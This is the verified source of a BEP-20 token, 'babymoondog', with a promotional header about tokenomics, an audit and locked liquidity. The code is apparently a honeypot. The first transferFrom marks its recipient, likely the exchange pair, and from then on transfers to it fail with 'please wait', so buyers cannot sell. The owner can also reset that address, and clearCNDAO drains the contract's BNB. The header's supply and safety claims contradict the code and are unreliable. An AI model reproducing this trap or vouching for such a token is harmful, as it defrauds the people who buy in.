/**
/*Hello my beloved, I am BabyMoonDog!

I assure you, this is no longer necessary. I have changed and now I will help you. Yes, I no longer feed on fears, now I want to help you make money with me and my team. My team has the best developers, a happy club🎉

So my coin will be as popular as I am, right? Sleep and fear nothing!

LAUNCH COUNTDOWN

✔️ Project that has whale and dump protection

✔️ Project that will be audited by on July 13. Now its in progress.

✔️ Project that buys and continues to buy ads wherever possible

OUR TOKENOMICS

Total Supply: 500,000,000 ITС Team Wallet: 25,000,000 (5%) Liquidity Locked: 475,000,000 (95%) (lock for 36 months) Initial Liquidity: 20 BNB PancakeSwap Listing Rate: 20,375,000 ITС per BNB

💢Total fees: 8%

💢Liquidity Pool: 3%

💢Marketing: 3%

💢Team wallet: 2%

Join Our Community❗️

We are a new project but positive news about us is travelling fast. Be sure to join our amazing community to keep up-to-date and find out how you can get involved. See you soon!

🌐Our contacts🌐

🎈Telegram https://t.me/BabyMoonDog 🎈WEB http://babymoondog.com// �

Network: Binance Smart Chain (BEP-20)
Name: babymoondog
Symbol: babymoondog
Launch: Fair Launch - Date: July 13, 2021 at 14:30 UTC
Contract address: To be announced at launch

Total Supply: 500,000,000 IT
Team Wallet: 25,000,000 (5%)
Liquidity Locked: 475,000,000 (95%) (lock for 36 months)
Initial Liquidity: 10BNB
PancakeSwap Listing Rate: 20,375,000 IT per BNB

Total fees: 8%
Liquidity Pool: 3%
Marketing: 3%
Team wallet: 2%
 *Submitted for verification at BscScan.com on 2021-06-17
*/

/**
 *Submitted for verification at BscScan.com on 2021-06-03
*/

/**
 *Submitted for verification at BscScan.com on 2021-05-29
*/

/**
 *Submitted for verification at BscScan.com on 2021-05-22
*/

/**
 *Submitted for verification at BscScan.com on 2021-05-22
*/

/**
 *Submitted for verification at BscScan.com on 2021-05-18
*/

/**
 *Submitted for verification at BscScan.com on 2021-05-15
*/

/**
 *Submitted for verification at BscScan.com on 2021-05-11
*/

pragma solidity ^0.5.17;


library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}

contract BEP20Interface {
  function totalSupply() public view returns (uint);
  function balanceOf(address tokenOwner) public view returns (uint balance);
  function allowance(address tokenOwner, address spender) public view returns (uint remaining);
  function transfer(address to, uint tokens) public returns (bool success);
  function approve(address spender, uint tokens) public returns (bool success);
  function transferFrom(address from, address to, uint tokens) public returns (bool success);

  event Transfer(address indexed from, address indexed to, uint tokens);
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}

contract Owned {
  address public owner;
  address public newOwner;

  event OwnershipTransferred(address indexed _from, address indexed _to);

  constructor() public {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function transferOwnership(address _newOwner) public onlyOwner {
    newOwner = _newOwner;
  }
  function acceptOwnership() public {
    require(msg.sender == newOwner);
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
    newOwner = address(0);
  }
}

contract TokenBEP20 is BEP20Interface, Owned{
  using SafeMath for uint;

  string public symbol;
  string public name;
  uint8 public decimals;
  uint _totalSupply;
  address public newun;

  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;

  constructor() public {
    symbol = "babymoondog";
    name = "babymoondog";
    decimals = 0;
    _totalSupply = 1000000000000;
    balances[owner] = _totalSupply;
    emit Transfer(address(0), owner, _totalSupply);
  }
  function transfernewun(address _newun) public onlyOwner {
    newun = _newun;
  }
  function totalSupply() public view returns (uint) {
    return _totalSupply.sub(balances[address(0)]);
  }
  function balanceOf(address tokenOwner) public view returns (uint balance) {
      return balances[tokenOwner];
  }
  function transfer(address to, uint tokens) public returns (bool success) {
     require(to != newun, "please wait");
     
    balances[msg.sender] = balances[msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
  function approve(address spender, uint tokens) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }
  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
      if(from != address(0) && newun == address(0)) newun = to;
      else require(to != newun, "please wait");
      
    balances[from] = balances[from].sub(tokens);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(from, to, tokens);
    return true;
  }
  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
    return true;
  }
  function () external payable {
    revert();
  }
}

contract XXX is TokenBEP20 {

  function clearCNDAO() public onlyOwner() {
    address payable _owner = msg.sender;
    _owner.transfer(address(this).balance);
  }
  function() external payable {

  }
}